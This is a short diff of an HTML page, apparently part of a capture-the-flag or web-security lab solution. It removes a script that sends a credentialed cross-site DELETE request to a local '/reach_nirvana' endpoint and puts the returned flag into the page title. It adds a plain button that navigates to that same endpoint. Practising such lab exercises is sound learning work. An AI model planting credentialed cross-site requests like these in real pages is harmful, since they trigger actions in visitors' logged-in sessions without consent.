@@ -2,19 +2,9 @@
 <html>
 <body>
 
-<button onclick="pwn()">Submit</button>
-
-<script>
-async function pwn() {
-  const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
-    method: 'DELETE',
-    credentials: 'include'
-  });
-
-  const flag = await r.text();
-  document.title = flag;
-}
-</script>
+<button onclick="location.href='http://127.0.0.1:3000/reach_nirvana'">
+Submit
+</button>
 
 </body>
 </html>
